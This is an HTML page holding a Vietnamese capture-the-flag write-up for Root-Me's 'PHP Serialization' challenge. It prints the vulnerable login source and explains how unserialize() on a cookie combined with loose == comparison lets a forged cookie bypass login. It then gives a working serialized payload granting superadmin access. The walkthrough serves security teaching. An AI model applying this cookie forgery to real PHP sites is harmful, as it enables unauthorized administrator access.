<main class="main" role="main">
    <div class="content">
        <article id="post-php_object_injection/der_chall1" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    PHP Serialization
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a></div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/PHP-Serialization" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/PHP-Serialization</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>Authentication bypass</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Get an administrator access!</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <p>Source web:<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'INCLUDEOK'</span>, <span class="keyword">true</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'showsource'</span>])){</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/******** AUTHENTICATION *******/</span></span><br><span class="line"><span class="comment">// login / passwords in a PHP array (sha256 for passwords) !</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./passwd.inc.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) || !$_SESSION[<span class="string">'login'</span>]) {</span><br><span class="line">    $_SESSION[<span class="string">'login'</span>] = <span class="string">""</span>;</span><br><span class="line">    <span class="comment">// form posted ?</span></span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'login'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>]){</span><br><span class="line">        $data[<span class="string">'login'</span>] = $_POST[<span class="string">'login'</span>];</span><br><span class="line">        $data[<span class="string">'password'</span>] = hash(<span class="string">'sha256'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// autologin cookie ?</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($_COOKIE[<span class="string">'autologin'</span>]){</span><br><span class="line">        $data = unserialize($_COOKIE[<span class="string">'autologin'</span>]);</span><br><span class="line">        $autologin = <span class="string">"autologin"</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// check password !</span></span><br><span class="line">    <span class="keyword">if</span> ($data[<span class="string">'password'</span>] == $auth[ $data[<span class="string">'login'</span>] ] ) {</span><br><span class="line">        $_SESSION[<span class="string">'login'</span>] = $data[<span class="string">'login'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set cookie for autologin if requested</span></span><br><span class="line">        <span class="keyword">if</span>($_POST[<span class="string">'autologin'</span>] === <span class="string">"1"</span>){</span><br><span class="line">            setcookie(<span class="string">'autologin'</span>, serialize($data));</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">// error message</span></span><br><span class="line">        $message = <span class="string">"Error : $autologin authentication failed !"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*********************************/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Ta focus vào:</p>
                <blockquote>
                    <p>$data = unserialize($COOKIE['autologin']);</p>
                </blockquote>
                <p>Và đoạn so sánh:</p>
                <blockquote>
                    <p>$data['password'] == $auth[ $data['login'] ] </p>
                </blockquote>
                <p>Ta nhìn thấy đoạn so sánh trên dùng == chứ không phải ===, với PHP điều này rất dễ bypass.<br>Ví dụ:  var_dump(True == “This is a string!”); =&gt; True</p>
                <h2 id="Test-chuc-nang"><a href="#Test-chuc-nang" class="headerlink" title="Test chức năng"></a>Test chức năng</h2>
                <p>Ta để ý trong cookie có trường autologin khi ta đăng nhập bằng guest/guest và check in nhớ mật khẩu:</p>
                <blockquote>
                    <p>autologin=a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A5%3A%22guest%22%3Bs%3A8%3A%22password%22%3Bs%3A64%3A%2284983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec%22%3B%7D</p>
                </blockquote>
                <p>URL decode, ta thấy:<br></p>
                <figure class="highlight bash">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">a:2:{s:5:<span class="string">"login"</span>;s:5:<span class="string">"guest"</span>;s:8:<span class="string">"password"</span>;s:64:<span class="string">"84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec"</span>;}</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Đây là dạng mẫu của serialize.<br>Giờ ta cần những thuộc tính sau:</p>
                <ul>
                    <li>login = ‘superamdin’</li>
                    <li>password = True (Để bypass đoạn compare ==)</li>
                </ul>
                <h2 id="Tao-payload"><a href="#Tao-payload" class="headerlink" title="Tạo payload"></a>Tạo payload</h2>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = <span class="keyword">array</span>(<span class="string">'login'</span> =&gt; <span class="string">'superadmin'</span>, <span class="string">'password'</span> =&gt; <span class="keyword">True</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($data));</span><br><span class="line"><span class="comment"># Kết quả:</span></span><br><span class="line">a%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>login%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>superadmin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p>Đặt payload vào cookie và thành công!</p>
                <h2 id="Neu-ko-thanh-cong-hay-xoa-cookie-cu-di-nhe-Thu-lai"><a href="#Neu-ko-thanh-cong-hay-xoa-cookie-cu-di-nhe-Thu-lai" class="headerlink" title="Nếu ko thành công,hãy xoá cookie cũ đi nhé. Thử lại."></a>Nếu ko thành công,hãy xoá cookie cũ đi nhé. Thử lại.</h2>
                </div></div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>
</main>